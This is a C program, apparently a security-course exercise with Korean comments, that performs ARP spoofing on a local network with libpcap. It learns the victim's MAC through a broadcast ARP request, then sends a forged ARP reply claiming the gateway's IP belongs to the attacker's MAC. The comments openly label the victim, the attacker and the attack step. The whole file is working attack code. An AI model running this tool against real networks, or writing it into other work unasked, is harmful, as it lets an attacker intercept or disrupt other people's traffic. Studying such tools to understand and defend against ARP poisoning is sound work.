#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#define ETHLEN 14
#define ARPLEN 28

typedef struct eth_header {
	uint8_t dst_mac[6];
	uint8_t src_mac[6];
	uint8_t type[2];
} eth_header;

typedef struct arp_header {
	uint8_t hardware_type[2];
	uint8_t protocol_type[2];
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint8_t opcode[2];
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
} arp_header;


void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	
	char *dev = argv[1];

	uint8_t packet[ETHLEN+ARPLEN];
	uint32_t len_packet;
	

  // 네트워크 상황: AP, A (victim), B (attacker) / B 는 A의 IP (AIP) 를 알고있다
	uint8_t AP_IP[4];
	uint8_t A_IP[4];
	uint32_t A_IP_HEX = inet_addr(argv[3]);
	for (int i = 0; i < 4; i++) A_IP[i] = *((uint8_t *)&A_IP_HEX + i); // HEX to array

  // step 1: B 가 자신의 MAC (BMAC) 과 IP (BIP) 를 얻는다
	uint8_t B_MAC[6];
	uint8_t B_IP[4];
	
	//
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, dev);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
		for (int i = 0; i < 6; i++) B_MAC[i] = s.ifr_addr.sa_data[i];
	close(fd);

	uint32_t B_IP_HEX = inet_addr(argv[2]);
	for (int i = 0; i < 4; i++) B_IP[i] = *((uint8_t *)&B_IP_HEX + i); // HEX to array


	for (int i = 0; i < 4; i++) AP_IP[i] = B_IP[i];
	AP_IP[3] = 1; // AP_IP


  // step 2: B 가 AMAC 을 구한다
  // B -> BROADCAST: ETH (sm: BMAC, dm: FF:FF:FF:FF:FF:FF), ARP (sm: BMAC, si: BIP, tm: 00:00:00:00:00:00, ti: AIP)
  // A -> B: ETH (sm: AMAC, dm: BMAC), ARP (sm: AMAC, si: AIP, tm: BMAC, ti: BIP)
	uint8_t A_MAC[6];

	uint8_t BROADCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t UNKNOWN[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	eth_header eth;
	arp_header arp;

	for (int i = 0; i < 6; i++) eth.src_mac[i] = B_MAC[i];
	for (int i = 0; i < 6; i++) eth.dst_mac[i] = BROADCAST[i];
	eth.type[0] = 0x08;
	eth.type[1] = 0x06;
	
	arp.hardware_type[0] = 0x00;
	arp.hardware_type[1] = 0x01;
	arp.protocol_type[0] = 0x08;
	arp.protocol_type[1] = 0x00;
	arp.hardware_size = 6;
	arp.protocol_size = 4;
	arp.opcode[0] = 0x00;
	arp.opcode[1] = 0x01; // ARP request
	for (int i = 0; i < 6; i++) arp.sender_mac[i] = B_MAC[i];
	for (int i = 0; i < 4; i++) arp.sender_ip[i] = B_IP[i];
	for (int i = 0; i < 6; i++) arp.target_mac[i] = UNKNOWN[i];
	for (int i = 0; i < 4; i++) arp.target_ip[i] = A_IP[i];
	
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet+ETHLEN, &arp, sizeof(arp));

	if (pcap_sendpacket(handle, packet, ETHLEN+ARPLEN) != 0) {
		printf("Error sending packet\n");
		return -1;
	}

	while (1) {
		struct pcap_pkthdr* header;
		const u_char *pkt;
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		uint8_t *ptr = (uint8_t *)pkt;
	
		// ARP Check
		if (*(ptr+12) == 0x08 && *(ptr+13) == 0x06) {
			for (int i = 0; i < 6; i++) A_MAC[i] = *(ptr+ETHLEN+8+i);
			break;
		}
	}
	
	printf("B_MAC: ");
	for(int i=0; i<6;i++) printf("%02x ", B_MAC[i]);
	printf("\nB_IP: ");
	for(int i=0;i<4;i++) printf("%d ", B_IP[i]);
	printf("\nA_MAC: ");
	for(int i=0;i<6;i++) printf("%02x ", A_MAC[i]);
	printf("\nA_IP: ");
	for(int i =0;i<4;i++) printf("%d ", A_IP[i]);
	printf("\n");

  // step 3: AIP, AMAC 을 이용해 B가 A에게 ARP Spoofing 공격
  // B -> A: ETH (sm: BMAC, dm: AMAC), ARP (sm: BMAC, si: APIP, tm: AMAC, ti: AIP)

	for (int i = 0; i < 6; i++) eth.src_mac[i] = B_MAC[i];
	for (int i = 0; i < 6; i++) eth.dst_mac[i] = A_MAC[i];
	eth.type[0] = 0x08;
	eth.type[1] = 0x06;

	arp.hardware_type[0] = 0x00;
	arp.hardware_type[1] = 0x01;
	arp.protocol_type[0] = 0x08;
	arp.protocol_type[1] = 0x00;
	arp.hardware_size = 6;
	arp.protocol_size = 4;
	arp.opcode[0] = 0x00;
	arp.opcode[1] = 0x02; // ARP reply
	for (int i = 0; i < 6; i++) arp.sender_mac[i] = B_MAC[i];
	for (int i = 0; i < 4; i++) arp.sender_ip[i] = AP_IP[i];
	for (int i = 0; i < 6; i++) arp.target_mac[i] = A_MAC[i];
	for (int i = 0; i < 4; i++) arp.target_ip[i] = A_IP[i];

	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet+ETHLEN, &arp, sizeof(arp));

	if (pcap_sendpacket(handle, packet, ETHLEN+ARPLEN) != 0) {
		printf("Error sending packet\n");
		return -1;
	}

	pcap_close(handle);
	return 0;
}
